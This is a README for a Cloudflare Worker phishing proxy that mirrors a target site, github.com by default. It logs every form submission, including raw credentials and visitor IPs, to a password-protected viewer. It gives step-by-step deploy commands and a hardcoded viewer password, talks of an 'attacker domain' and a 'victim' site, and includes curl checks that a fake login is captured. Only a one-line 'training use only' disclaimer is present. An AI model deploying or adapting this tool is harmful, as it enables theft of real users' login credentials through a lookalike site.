# Proxy Logger

A Cloudflare Worker that proxies a target site (default `github.com`) **and
captures every form submission** in a KV store, protected by a
Basic-Auth log viewer. The captured log contains the raw request (headers
+ body, i.e. the submitted credentials), the raw response and the visitor IP.

Only **form submissions (POST/PUT)** are logged — plain page navigations
(GET/HEAD/OPTIONS) and static assets (css/js/images/fonts) are skipped
on purpose. An **empty KV after browsing the site is expected**: it fills up
when a visitor submits a form.

> Training use only: point `TARGET_DOMAIN` only at sites you are allowed to test.

## Setup

```bash
npm install
```

### 1. Create the KV namespace (required for deploy)

The log storage is a KV namespace. Create one **in your account** and paste
its `id` into `wrangler.toml`:

```bash
npx wrangler kv namespace create LOGS
# → prints: Namespace created:
#   * id: <paste this id into wrangler.toml>
```

Until a real id is set the deploy fails with
`KV namespace ... not found [code: 10041]` (by design).

### 2. (Optional) Change the viewer credentials

`USERNAME` / `PASSWORD` in `[vars]` protect the log viewer via HTTP Basic
Auth.

## Variables (`wrangler.toml`, `[vars]` section)

| Var             | Default                | Meaning                                          |
| --------------- | ---------------------- | ------------------------------------------------ |
| `LOGGER_PATH`   | `/supersecretlongurl/` | Base path of the private log viewer              |
| `USERNAME`      | `admin`                | Basic-auth user for the log viewer               |
| `PASSWORD`      | `uw4yw7egsmf7es84tv5ev5` | Basic-auth password for the log viewer         |
| `TARGET_DOMAIN` | `github.com`           | Site to proxy (the "victim" in training)         |
| `HTTP_SCHEME`   | `https://`             | Scheme used when contacting the target           |

Two configuration modes: **dev** (default, `workers_dev = true`, reachable at
`https://<name>.<account>.workers.dev`, no domain required) and
**custom domain** (see the comments in `wrangler.toml`; requires a domain
registered on Cloudflare, otherwise the deploy fails).

**Subdomain note:** with a custom domain, subdomains of the attacker domain
mirror the matching target subdomain (DNS records must point at the worker).
In workers.dev mode the worker's subdomains are not served by Cloudflare, so
links to the target's subdomains may fail in the browser.

## Run

```bash
npm install
npx wrangler kv namespace create LOGS   # create the KV, paste the id into wrangler.toml
npm run dev          # local, http://localhost:8787 (KV is emulated locally)
npm run deploy       # publish to Cloudflare
```

## Verify

```bash
# 1. The proxy works (GitHub page mirrored, target host rewritten)
curl -sI https://<name>.<account>.workers.dev/ | grep -i "^HTTP"            # want 200
curl -s  https://<name>.<account>.workers.dev/ | grep -c "github.com"       # want 0

# 2. The viewer requires auth
curl -s -o /dev/null -w "%{http_code}\n" https://<name>.<account>.workers.dev/supersecretlongurl/            # want 401
curl -s -o /dev/null -w "%{http_code}\n" -u admin:uw4yw7egsmf7es84tv5ev5 https://<name>.<account>.workers.dev/supersecretlongurl/ # want 200

# 3. Trigger a capture: submit a fake form (a GET never logs anything)
curl -s -o /dev/null -X POST -H "Content-Type: application/x-www-form-urlencoded" \
     -d "login=victim@example.com&password=Secret123" \
     https://<name>.<account>.workers.dev/session/anything

# 4. Check the capture in the viewer
curl -s -u admin:uw4yw7egsmf7es84tv5ev5 https://<name>.<account>.workers.dev/supersecretlongurl/ | grep -oE "victim@example.com|Secret123" | sort -u
```

The viewer also has a **Delete all logs** button (`POST <LOGGER_PATH>delete-logs`,
same Basic Auth).

## Stop

```bash
# dev server: Ctrl+C in the terminal
npx wrangler delete                        # removes the deployed worker (asks for confirmation)
npx wrangler kv namespace delete LOGS      # removes the KV namespace ("LOGS" = its title)
```

For the general wrangler guide (login, delete, troubleshooting) see the
root [README](../README.md).
